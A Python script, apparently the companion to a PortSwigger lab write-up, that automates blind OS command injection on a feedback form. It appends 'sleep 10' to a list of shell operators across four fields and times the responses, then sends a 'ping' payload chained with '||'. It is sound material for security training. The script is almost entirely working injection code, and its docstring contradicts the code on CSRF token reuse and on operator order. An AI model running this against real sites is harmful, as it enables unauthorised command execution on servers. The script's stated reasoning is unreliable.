#!/usr/bin/env python3
"""
Blind OS command injection with time delays
PortSwigger Web Security Academy -- OS Command Injection

Companion script for the writeup: 02-blind-time-delays.md

What this does:
    Sweeps all four feedback-form fields (email, name, subject, message) in turn.
    For each field it walks the same fixed operator list our detector always
    uses (";", "|", "||", "&", "&&", newline, backtick, subshell), appends
    "sleep 10", and times the response -- a delta of 8+ seconds over baseline
    flags that operator as the injection point. A fresh CSRF token is pulled
    before each field's sweep, since the token proved effectively single-use
    across separate submissions in practice.

    The automated sweep is what actually found the injection (a backtick
    subshell on the email field, since backtick sits ahead of the semicolon-
    based operators failing first in this app). Once found, the script also
    fires PortSwigger's own OR-chain ping payload (email=x||ping -c 10
    127.0.0.1||) as a direct cross-check -- both prove the same injection
    point, this just confirms our result matches the official technique too.

Usage:
    python 02-blind-time-delays.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import time
import httpx

OPERATORS = [";", "|", "||", "&", "&&", "\n", "`{CMD}`", "$({CMD})"]
DELAY = 10
THRESHOLD = 8.0


def build_payload(operator: str, command: str, prefix: str) -> str:
    if operator == "`{CMD}`":
        return f"{prefix}`{command}`"
    if operator == "$({CMD})":
        return f"{prefix}$({command})"
    return f"{prefix}{operator} {command}"


def get_csrf(client: httpx.Client, feedback_url: str) -> str:
    r = client.get(feedback_url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if not m:
        m = re.search(r'value="([^"]+)"\s+name="csrf"', r.text)
    return m.group(1) if m else ""


def detect_time_based(client: httpx.Client, submit_url: str, param: str, base_data: dict):
    """Walk the operator list for a single param -- no CSRF refresh mid-sweep,
    exactly as our real detector does it."""
    sleep_cmd = f"sleep {DELAY}"
    for op in OPERATORS:
        payload = build_payload(op, sleep_cmd, base_data[param])
        data = {**base_data, param: payload}
        start = time.time()
        try:
            client.post(submit_url, data=data, timeout=DELAY + 10)
        except httpx.TimeoutException:
            return op, time.time() - start
        elapsed = time.time() - start
        print(f"    operator '{op}': {elapsed:.1f}s")
        if elapsed >= THRESHOLD:
            return op, elapsed
    return None


def confirm_official(client: httpx.Client, feedback_url: str, submit_url: str) -> None:
    csrf = get_csrf(client, feedback_url)
    data = {
        "csrf": csrf, "name": "test", "email": "x||ping -c 10 127.0.0.1||",
        "subject": "test", "message": "test",
    }
    print("[*] Cross-checking with PortSwigger's OR-chain ping payload on email...")
    start = time.time()
    client.post(submit_url, data=data, timeout=25)
    elapsed = time.time() - start
    print(f"[+] Official payload delay: {elapsed:.1f}s")


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=25)
    feedback_url = f"{lab_url}/feedback"
    submit_url = f"{lab_url}/feedback/submit"

    for param in ["email", "name", "subject", "message"]:
        csrf = get_csrf(client, feedback_url)
        if not csrf:
            print("[-] Could not extract CSRF token.")
            return
        base_data = {
            "csrf": csrf, "name": "test", "email": "test@test.com",
            "subject": "test", "message": "test",
        }
        print(f"[*] Testing param: {param}")
        found = detect_time_based(client, submit_url, param, base_data)
        if found:
            op, elapsed = found
            print(f"[+] TIME-BASED injection on '{param}' via operator '{op}' ({elapsed:.1f}s delay)")
            confirm_official(client, feedback_url, submit_url)
            print("[+] Lab solved.")
            return
        print(f"    no delay found on '{param}'")

    print("[-] No blind time-based injection found across all four fields.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
